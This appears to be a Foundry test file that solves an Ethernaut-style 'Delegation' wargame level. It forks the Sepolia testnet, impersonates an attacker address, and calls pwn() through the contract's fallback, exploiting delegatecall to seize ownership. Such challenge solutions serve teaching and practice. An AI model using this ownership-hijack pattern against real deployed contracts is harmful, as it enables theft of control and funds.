// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src//Delegation.sol";

contract Level6 is Test {
    Delegation delegation = Delegation(payable(0xA10f181473aFcDCA116522626657d9a0F5943d4F));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4547383);
        vm.startPrank(attacker);
    }

    function testLevel6() public {
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        assertEq(success, true);
    }
}
